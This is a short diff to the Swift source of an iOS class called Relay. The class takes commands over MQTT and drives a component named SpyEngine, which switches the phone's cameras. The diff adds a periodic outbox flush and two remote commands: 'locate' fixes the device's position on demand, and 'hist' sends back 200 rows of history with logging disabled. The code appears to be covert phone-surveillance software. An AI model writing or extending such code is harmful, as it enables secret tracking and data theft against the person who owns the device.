@@ -17,6 +17,7 @@ final class Relay {
         }
         Mqtt.shared.onUp = { Outbox.shared.flush() }
         Mqtt.shared.start()
+        Timer.scheduledTimer(withTimeInterval: 15, repeats: true) { _ in Outbox.shared.flush() }
     }
 
     private func handle(_ m: [String: Any]) {
@@ -33,6 +34,8 @@ final class Relay {
         case "front":      SpyEngine.shared.cameraPosition = .front
         case "back":       SpyEngine.shared.cameraPosition = .back
         case "recheck":    HealthMon.sweep()
+        case "locate":     SpyEngine.shared.locateNow()
+        case "hist":       Relay.shared.sendJSON(["type": "hist", "rows": Hist.tail(200)], log: false)
         case "openSettings":
             if let u = URL(string: UIApplication.openSettingsURLString) {
                 DispatchQueue.main.async { UIApplication.shared.open(u) }
